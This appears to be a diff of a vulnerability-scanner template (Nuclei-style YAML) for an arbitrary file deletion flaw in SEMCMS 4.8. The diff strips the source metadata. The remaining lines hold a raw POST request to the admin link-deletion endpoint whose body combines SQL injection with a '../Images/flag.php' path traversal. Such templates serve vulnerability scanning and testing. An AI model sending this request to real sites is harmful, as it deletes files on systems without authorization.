@@ -3,12 +3,8 @@ info:
   name: SEMCMS 任意文件删除漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wug6536hwkkv5kei'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wug6536hwkkv5kei
-    fofa: 暂无
 http:
 - raw:
   - 'POST /semcms_php_4.8/916lGe_Admin/SEMCMS_Link.php?Class=Deleted&CF=link&page= HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Upgrade-Insecure-Requests: 1
-
-
 
 
     languageID=1&AID%5B%5D=2)union select 1,2,3,4,5,6,''../Images/flag.php''  #
